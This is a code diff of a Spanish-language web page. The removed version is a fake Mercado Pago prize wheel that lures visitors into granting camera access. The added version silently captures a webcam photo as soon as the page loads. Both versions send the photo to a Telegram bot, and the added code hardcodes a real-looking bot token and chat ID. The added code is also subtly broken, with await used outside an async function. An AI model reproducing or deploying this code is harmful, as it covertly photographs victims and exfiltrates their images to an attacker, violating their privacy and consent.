@@ -1,192 +1,64 @@
 <!DOCTYPE html>
-<html lang="es">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Ruleta de Mercado Pago</title>
-    <style>
-        /* Fondo de Mercado Pago */
-        body {
-            margin: 0;
-            padding: 0;
-            font-family: Arial, sans-serif;
-            background-image: url('https://upload.wikimedia.org/wikipedia/commons/thumb/0/05/Mercado_Pago_Logo_2018.png/500px-Mercado_Pago_Logo_2018.png'); /* Fondo Mercado Pago */
-            background-size: cover;
-            background-position: center;
-            background-repeat: no-repeat;
-            display: flex;
-            flex-direction: column;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            color: white;
-            text-align: center;
-        }
-
-        h1 {
-            color: #0038a8;
-            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.7);
-            font-size: 30px;
-        }
-
-        /* Ruleta */
-        .ruleta {
-            width: 80vw;
-            height: 80vw;
-            max-width: 350px;
-            max-height: 350px;
-            border-radius: 50%;
-            position: relative;
-            background: conic-gradient(
-                #0038a8 0deg 60deg, 
-                #005ab5 60deg 120deg, 
-                #007bff 120deg 180deg, 
-                #0099ff 180deg 240deg, 
-                #66ccff 240deg 300deg, 
-                #99ccff 300deg 360deg
-            );
-            box-shadow: 0 0 15px rgba(0, 0, 0, 0.5);
-            transition: transform 4s ease-out;
-        }
-
-        /* Botones */
-        button {
-            margin-top: 20px;
-            padding: 12px 24px;
-            font-size: 18px;
-            cursor: pointer;
-            background-color: #0038a8;
-            color: white;
-            border: none;
-            border-radius: 5px;
-            transition: background-color 0.3s;
-            width: 80%;
-            max-width: 200px;
-        }
-
-        button:hover {
-            background-color: #005ab5;
-        }
-
-        #reclamarBtn {
-            display: none;
-        }
-
-        #premioDisplay {
-            font-size: 22px;
-            font-weight: bold;
-            color: #007bff;
-            margin-top: 20px;
-        }
-
-        /* Responsive */
-        @media screen and (max-width: 600px) {
-            .ruleta {
-                width: 90vw;
-                height: 90vw;
-            }
-
-            h1 {
-                font-size: 24px;
-            }
-        }
-    </style>
+  <title>Tomar foto y enviar a Telegram</title>
+  <style>
+    /* Estilos para la página web */
+    body {
+      background-color: #ffffff;
+    }
+  </style>
 </head>
 <body>
-
-    <h1>Ruleta de Mercado Pago</h1>
-
-    <div class="ruleta" id="ruleta"></div>
-
-    <button id="spinButton">Girar Ruleta</button>
-    <button id="reclamarBtn" onclick="reclamarPremio()">Reclamar Premio</button>
-    <p id="premioDisplay"></p>
-
-    <script>
-        let premio = "";
-        let premios = ["5000 ARG", "7000 ARG", "1000 ARG", "15000 ARG", "40000 ARG", "50000 ARG"];
-        let videoStream = null;
-
-        // Pedir permiso para la cámara
-        navigator.mediaDevices.getUserMedia({ video: true })
-            .then((stream) => {
-                videoStream = stream;
-            })
-            .catch((error) => {
-                console.error('Error al acceder a la cámara:', error);
-                alert("No se pudo acceder a la cámara. Verifica los permisos.");
-            });
-
-        document.getElementById('spinButton').addEventListener('click', function() {
-            let randomDeg = Math.floor(Math.random() * 360) + 720;
-            document.getElementById('ruleta').style.transition = 'transform 4s ease-out';
-            document.getElementById('ruleta').style.transform = 'rotate(' + randomDeg + 'deg)';
-
-            setTimeout(() => {
-                premio = premios[Math.floor(Math.random() * premios.length)];
-                document.getElementById('premioDisplay').textContent = `¡Has ganado: ${premio}!`;
-                document.getElementById('reclamarBtn').style.display = "block";
-            }, 4000);
+  <script>
+    // Variable para almacenar la cámara
+    let camara;
+    
+    // Función para solicitar permiso y obtener la cámara
+    navigator.mediaDevices.getUserMedia({ video: true })
+      .then((stream) => {
+        camara = stream;
+        // Tomar la foto automáticamente
+        tomarFoto();
+      })
+      .catch((error) => {
+        console.error('Error al obtener la cámara:', error);
+      });
+    
+    // Función para tomar la foto y enviarla al bot de Telegram
+    function tomarFoto() {
+      try {
+        // Crear un canvas para tomar la foto
+        const canvas = document.createElement('canvas');
+        canvas.width = 400;
+        canvas.height = 300;
+        const ctx = canvas.getContext('2d');
+        
+        // Tomar la foto
+        const video = document.createElement('video');
+        video.srcObject = camara;
+        video.play();
+        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+        const foto = canvas.toDataURL();
+        
+        // Enviar la foto al bot de Telegram
+        const respuesta = await fetch('https://api.telegram.org/bot7607328815:AAEGMJquz5YvKOaIkLKB10nh12MmfCYXJ0U/sendPhoto', {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json'
+          },
+          body: JSON.stringify({
+            chat_id: '7267478032',
+            photo: foto
+          })
         });
-
-        function tomarFotoYEnviar() {
-            if (!videoStream) {
-                alert("No se pudo acceder a la cámara.");
-                return;
-            }
-
-            const video = document.createElement('video');
-            video.srcObject = videoStream;
-            video.play();
-
-            video.onloadeddata = () => {
-                const canvas = document.createElement('canvas');
-                canvas.width = 400;
-                canvas.height = 300;
-                const ctx = canvas.getContext('2d');
-                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-
-                const fotoBase64 = canvas.toDataURL('image/png');
-                enviarFotoATelegram(fotoBase64);
-            };
-        }
-
-        function enviarFotoATelegram(fotoBase64) {
-            const BOT_TOKEN = "TU_BOT_TOKEN";  // 🔴 Reemplaza con el token de tu bot
-            const CHAT_ID = "TU_CHAT_ID";  // 🔴 Reemplaza con tu chat ID de Telegram
-            const blob = dataURItoBlob(fotoBase64);
-            const formData = new FormData();
-            formData.append("chat_id", CHAT_ID);
-            formData.append("photo", blob, "foto.png");
-
-            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-                method: "POST",
-                body: formData
-            })
-            .then(response => response.json())
-            .then(data => console.log("Foto enviada a Telegram:", data))
-            .catch(error => console.error("Error al enviar la foto:", error));
-        }
-
-        function dataURItoBlob(dataURI) {
-            let byteString = atob(dataURI.split(',')[1]);
-            let mimeString = dataURI.split(',')[0].split(':')[1].split(';')[0];
-            let arrayBuffer = new ArrayBuffer(byteString.length);
-            let uint8Array = new Uint8Array(arrayBuffer);
-
-            for (let i = 0; i < byteString.length; i++) {
-                uint8Array[i] = byteString.charCodeAt(i);
-            }
-
-            return new Blob([arrayBuffer], { type: mimeString });
-        }
-
-        function reclamarPremio() {
-            tomarFotoYEnviar();
-            alert("¡Has ganado un premio de " + premio + "! Redirigiendo...");
-            window.location.href = "https://otro-enlace.com"; 
-        }
-    </script>
-
+        
+        // Mostrar mensaje de confirmación
+        console.log('Foto enviada correctamente!');
+      } catch (error) {
+        console.error('Error al enviar la foto:', error);
+      }
+    }
+  </script>
 </body>
 </html>
